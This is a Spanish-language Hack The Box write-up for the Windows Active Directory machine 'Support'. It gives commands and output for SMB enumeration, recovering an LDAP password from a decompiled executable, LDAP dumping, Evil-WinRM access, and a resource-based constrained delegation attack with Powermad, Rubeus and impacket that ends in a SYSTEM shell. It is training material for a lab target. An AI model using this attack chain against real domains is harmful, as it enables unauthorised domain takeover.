---
layout		: post
title		: "Support-HackTheBox"
author		: elc4br4
image		: assets/images/HTB/Support-HackTheBox/support.webp
category	: [ htb ]
tags		: [ Windows ]
---
Estamos ante una máquina Windows de nivel Easy en la que tocaremos Active Directory.

![](/assets/images/HTB/Support-HackTheBox/rating-support.png)

[![HTBadge](https://www.hackthebox.eu/badge/image/533771)](https://www.hackthebox.com/home/users/profile/533771)

# Reconocimiento de Puertos

EL nmap nos muestra lo siguiente:

Tenemos un servidor Windows que ejecuta un controlador de dominio de Active Directory.

```bash
PORT     STATE SERVICE       VERSION
53/tcp   open  domain        Simple DNS Plus
88/tcp   open  kerberos-sec  Microsoft Windows Kerberos (server time: 2022-09-09 13:53:28Z)
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: support.htb0., Site: Default-First-Site-Name)
445/tcp  open  microsoft-ds?
464/tcp  open  kpasswd5?
593/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp  open  tcpwrapped
3268/tcp open  ldap          Microsoft Windows Active Directory LDAP (Domain: support.htb0., Site: Default-First-Site-Name)
3269/tcp open  tcpwrapped
Service Info: Host: DC; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: -1s
| smb2-security-mode: 
|   3.1.1: 
|_    Message signing enabled and required
| smb2-time: 
|   date: 2022-09-09T13:53:38
|_  start_date: N/A
```

En el reporte del escaneo encontramos el nombre de dominio del DC **support.htb**.

A continuación enumero los servidores DNS para obtener el nombre de host.

```bash
❯ dig @10.10.11.174 +short support.htb any
10.10.11.174
dc.support.htb.
dc.support.htb. hostmaster.support.htb. 105 900 600 86400 3600
```

Como vemos el nombre de host es **dc** y el dominio es **support.htb**

Añadimos los datos al archivo hosts


![](/assets/images/HTB/Support-HackTheBox/hosts.png)


# Enumeración de recursos compartidos

A través del siguiente comando podremos ver los recursos compartidos de archivos SMB:

```bash
❯ smbclient -N -L \\\\10.10.11.174

	Sharename       Type      Comment
	---------       ----      -------
	ADMIN$          Disk      Remote Admin
	C$              Disk      Default share
	IPC$            IPC       Remote IPC
	NETLOGON        Disk      Logon server share 
	support-tools   Disk      support staff tools
	SYSVOL          Disk      Logon server share 
SMB1 disabled -- no workgroup available
```

![](/assets/images/HTB/Support-HackTheBox/smbclient.png)


```bash
❯ smbclient -N \\\\10.10.11.174\\support-tools
Try "help" to get a list of possible commands.
smb: \> dir
 
  7-ZipPortable_21.07.paf.exe          A  2880728  Sat May 28 13:19:19 2022
  npp.8.4.1.portable.x64.zip           A  5439245  Sat May 28 13:19:55 2022
  putty.exe                            A  1273576  Sat May 28 13:20:06 2022
  SysinternalsSuite.zip                A 48102161  Sat May 28 13:19:31 2022
  UserInfo.exe.zip                     A   277499  Wed Jul 20 19:01:07 2022
  windirstat1_1_2_setup.exe            A    79171  Sat May 28 13:20:17 2022
  WiresharkPortable64_3.6.5.paf.exe    A 44398000  Sat May 28 13:19:43 2022

		4026367 blocks of size 4096. 969831 blocks available
```

![](/assets/images/HTB/Support-HackTheBox/smbclient2.png)


Revisando los archivos, veo que son ejecutables normales y corrientes, pero el archivo **UserInfo.exe.zip** despierta mi curiosidad ya que es el único que no me parece una herramienta común.


# Analizar archivo ejecutable UserInfo.exe

Para analizar el arcivo usaré la herramienta **dnSpy**

[https://github.com/dnSpy/dnSpy](https://github.com/dnSpy/dnSpy)

Abrimos el archivo exe con el dnSpy y encontramos lo siguiente:


![](/assets/images/HTB/Support-HackTheBox/dnspy1.png)


Existe una comunicación cifrada con el Active Directory y tenemos el usuario de inicio de sesión del LDAP y el protocolo utilizado para la comunicación.

Buscando encuentro que hay una contraseña ofuscada dentro de la función protegida "getPassword()"


![](/assets/images/HTB/Support-HackTheBox/dnspy2.png)

A través de Wireshark es posible obtener la contraseña en texto claro al intentar conectarnos al AD.


Seguiremos los siguientes pasos:

1. Capturamos paquetes en la interfaz tun0

2. Ejecutamos el .exe con wine

3. Capturamos la solicitud de Autenticación

4. Dejamos de capturar paquetes


![](/assets/images/HTB/Support-HackTheBox/userinfo.png)

![](/assets/images/HTB/Support-HackTheBox/wireshark1.png)

![](/assets/images/HTB/Support-HackTheBox/wireshark2.png)


**PASSWORD --> nvEfEK16^1aM4$e7AclUf8x$tRWxPWO1%lmz**


# Enumeración LDAP

Ahora ya tenemos las credenciales por lo tanto ya hemos avanzado un pasito más.
Usaremos herramientas de enumeración LDAP.


```bash
ldapsearch -x -H ldap://dc.support.htb -D 'SUPPORT\ldap' -w 'nvEfEK16^1aM4$e7AclUf8x$tRWxPWO1%lmz' dc.support.htb | tee ldap_dc.support.htb.txt

ldapdomaindump -u 'support\ldap' -p 'nvEfEK16^1aM4$e7AclUf8x$tRWxPWO1%lmz' dc.support.htb
```


A continuación revisaremos toda la data dumpeada por el comando anterior, comenzando por los usuarios del dominio.

![](/assets/images/HTB/Support-HackTheBox/domain_users.png)


La cuenta support posee varios permisos, por lo tanto será el objetivo principal.

En el archivo **domain_users** encontramos lo que parece una contraseña.

![](/assets/images/HTB/Support-HackTheBox/domain_users_info.png)


Tras obtener esta posible contraseña intento conectarme al servidor a través de Evil-WinRM
 
[https://github.com/Hackplayers/evil-winrm](https://github.com/Hackplayers/evil-winrm)

```bash
evil-winrm -i dc.support.htb -u support -p 'Ironside47pleasure40Watchful'
```

![](/assets/images/HTB/Support-HackTheBox/evil-winrm1.png)


Ahora ya podemos leer la flag user


# Escalada de Privilegios

Para escalar privilegios primero he de buscar posibles vectores de escalada de privilegios, en mi caso usaré winpeas.sh

Lo subo a la máquina para su posterior ejecución:

``` powershell
*Evil-WinRM* PS C:\Users\support\Documents> upload /home/elc4br4/Descargas/winPEASx64.exe sh.exe
```

Realizaré lo mismo con SharpHound

```powershell
*Evil-WinRM* PS C:\Users\support\Documents> upload /opt/SharpHound/SharpHound.exe SharpHound.exe
```

![](/assets/images/HTB/Support-HackTheBox/evil-winrm2.png)

Ahora ejecutamos los archivos: en mi caso comenzaré con SharpHound


```powershell
*Evil-WinRM* PS C:\Users\support\Documents> ./SharpHound.exe --memcache -c all -d SUPPORT.HTB -DomainController 127.0.0.1
```

Ahora descargamos toda la data que nos crea en el archivo zip para abrirla después con BloodHound.


```powershell
*Evil-WinRM* PS C:\Users\support\Documents> download 20220909091115_BloodHound.zip 20220909091115_BloodHound.zip
Info: Downloading 20220909091115_BloodHound.zip to 20220909091115_BloodHound.zip

                                                             
Info: Download successful!
```

Ahora lo abrimos con BloodHound

Una vez lo analizamos veremos algo curioso


![](/assets/images/HTB/Support-HackTheBox/graph.png)


En BloodHound hemos podido ver que el usuario **Support** tiene permisos "GenericAll" sobre el AD-Object "dc.support.htb".
Podemos realizar un ataque basado en recursos de kerberos.

Aquí dejo las referencias.

[https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/resource-based-constrained-delegation-ad-computer-object-take-over-and-privilged-code-execution](https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/resource-based-constrained-delegation-ad-computer-object-take-over-and-privilged-code-execution) 

[https://book.hacktricks.xyz/windows-hardening/active-directory-methodology/resource-based-constrained-delegation](https://book.hacktricks.xyz/windows-hardening/active-directory-methodology/resource-based-constrained-delegation)


Para realizar la escalada necesitamos la suite impacket, powermad y Rubeus

```bash
https://github.com/Kevin-Robertson/Powermad
https://github.com/GhostPack/Rubeus
```

## El primer paso será subir las herramientas powermad y Rubeus

```powershell
*Evil-WinRM* PS C:\Users\support\Documents> upload /opt/Powermad
*Evil-WinRM* PS C:\Users\support\Documents> upload /opt/Rubeus
```

## Importamos Powermad

```powershell
*Evil-WinRM* PS C:\Users\support\Documents\Powermad> Import-Module ./Powermad.ps1 
```


## Seteamos las Variables

```powershell 
*Evil-WinRM* PS C:\Users\support\Documents\Powermad> Set-Variable -Name "elc4br4PC" -Value "ELC4BR4"

*Evil-WinRM* PS C:\Users\support\Documents\Powermad> Set-Variable -Name "targetComputer" -Value "DC"
```


Con Powermad añadimos un nuevo computer object al AD.

```powershell 
New-MachineAccount -MachineAccount (Get-Variable -Name "elc4br4PC").Value -Password $(ConvertTo-SecureString 'elc4br4' -AsPlainText -Force) -Verbose
```


Asiganmos privilegios de delegación:

```bash 
Set-ADComputer (Get-Variable -Name "targetComputer").Value -PrincipalsAllowedToDelegateToAccount ((Get-Variable -Name "elc4br4PC").Value + '$')
```

Y comprobamos que el comando funcionó correctamente:

```powershell
*Evil-WinRM* PS C:\Users\support\Documents\Powermad> Get-ADComputer (Get-Variable -Name "targetComputer").Value -Properties PrincipalsAllowedToDelegateToAccount


DistinguishedName                    : CN=DC,OU=Domain Controllers,DC=support,DC=htb
DNSHostName                          : dc.support.htb
Enabled                              : True
Name                                 : DC
ObjectClass                          : computer
ObjectGUID                           : afa13f1c-0399-4f7e-863f-e9c3b94c4127
PrincipalsAllowedToDelegateToAccount : {CN=ELC4BR4,CN=Computers,DC=support,DC=htb}
SamAccountName                       : DC$
SID                                  : S-1-5-21-1677581083-3380853377-188903654-1000
UserPrincipalName                    :
```
 
A continuación, usaré Rubeus para generar los hashes del nuevo pc FAKE


 ```powershell 
 *Evil-WinRM* PS C:\Users\support\Documents> ./Rubeus.exe hash /password:elc4br4 /user:ELC4BR4$ /domain:support.htb
 ```

![](/assets/images/HTB/Support-HackTheBox/rubeus.png)

HASH --> 31F429C15354CF5017A09D88CC57A495EEFB53884801AD5B48FF4EA02799357A

Hemos dado al computer object "ELC4RB4" los derechos para hacerse pasar por otros.
Ahora podemos solicitar el ticket-Granting-Ticket (TGT) de Kerberos mientras suplantamos la identidad del administrador.

Seguimos los siguientes pasos:

```bash
python3 getST.py support.htb/ELC4BR4 -dc-ip dc.support.htb -impersonate administrator -spn http/dc.support.htb -aesKey 31F429C15354CF5017A09D88CC57A495EEFB53884801AD5B48FF4EA02799357A

Impacket v0.10.1.dev1+20220720.103933.3c6713e3 - Copyright 2022 SecureAuth Corporation

[-] CCache file is not found. Skipping...
[*] Getting TGT for user
[*] Impersonating administrator
[*] 	Requesting S4U2self
[*] 	Requesting S4U2Proxy
[*] Saving ticket in administrator.ccache
```

```bash
 export KRB5CCNAME=administrator.ccache
 ```

```bash 
❯ python3 smbexec.py support.htb/administrator@dc.support.htb -no-pass -k
Impacket v0.10.1.dev1+20220720.103933.3c6713e3 - Copyright 2022 SecureAuth Corporation

[!] Launching semi-interactive shell - Careful what you execute
C:\Windows\system32>whoami
nt authority\system
```

![](/assets/images/HTB/Support-HackTheBox/root.png)

![](/assets/images/HTB/Support-HackTheBox/gif.gif)


